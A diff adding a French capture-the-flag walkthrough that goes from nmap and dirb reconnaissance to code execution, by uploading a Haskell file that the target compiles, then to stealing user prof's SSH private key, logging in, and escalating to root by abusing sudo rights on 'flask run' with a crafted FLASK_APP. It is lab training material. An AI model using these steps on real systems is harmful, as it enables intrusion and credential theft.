@@ -1,0 +1,69 @@
+
+Regarder les ports ouverts
+
+```bash
+nmap <ip>
+```
+=>
+22/tcp open ssh
+5001/tcp open commplex-link
+
+-> Vérifier le site web sur le port 5001
+--> Redirection vers la page /homework
+=> Possibilité de déposer un fichier en Haskell qui sera compilé
+
+-> Vérifier les autres pages avec :
+```bash
+dirb http://<ip>:5001
+```
+=>
+dirb automatique avec common.txt seul /homework a été trouvé, donc nous avons que / et /homework
+
+Après avoir essayé de mettre le fichier "hello.hs" et avoir eu une réponse positive, envoyer des fichiers ressemblant à "getData.hs" mais modifier le processus shell pour faire des ls, des cat et des cd. Envoyer le fichier "getData.hs" qui obtient le id_rsa du user prof.
+
+Dans le résultat, copier de "-----BEGIN RSA PRIVATE KEY-----" à "-----END RSA PRIVATE KEY-----" dans un fichier en local id_rsa, puis donner les droits d'écriture et de lecture au fichier.
+
+```bash
+chmod 600 id_rsa
+```
+
+Avec le port ssh (22), le nom d'utilisateur (prof) et l'id_rsa, on peut se connecter en ssh.
+Se connecter en ssh sur le user prof avec le rsa.
+
+```bash
+ssh prof@<ip> -i id_rsa
+```
+Puis accepter de continuer la connexion.
+
+```bash
+cat user.txt
+```
+
+Vérifier quelles commandes on a le droit d'utiliser.
+
+```bash
+sudo -l
+```
+=>
+(root) NOPASSWD: /usr/bin/flask run
+
+Nous pouvons voir que nous pouvons exécuter Flask, nous pouvons essayer de modifier des variables d'environnement de Flask comme FLASK_APP, FLASK_ENV, FLASK_DEBUG, FLASK_RUN_PORT, FLASK_RUN_HOST, FLASK_SECRET_KEY, FLASK_SQLALCHEMY_DATABASE_URI ou FLASK_JWT_SECRET_KEY.
+
+Nous pouvons donc créer le fichier "flaskApp.py" et affecter notre fichier "flaskApp.py" à une variable d'environnement de Flask comme FLASK_APP.
+
+```bash
+export FLASK_APP=flaskApp.py
+```
+
+Maintenant, lorsque une application Flask sera lancée, cela va nous lancer un shell avec les droits root.
+
+```bash
+sudo /usr/bin/flask run
+```
+
+Une fois dans ce terminal avec les droits root, nous pouvons nous promener comme nous le voulons et trouver le flag root.txt à cet endroit.
+
+bash
+```
+cat /root/root.txt
+```
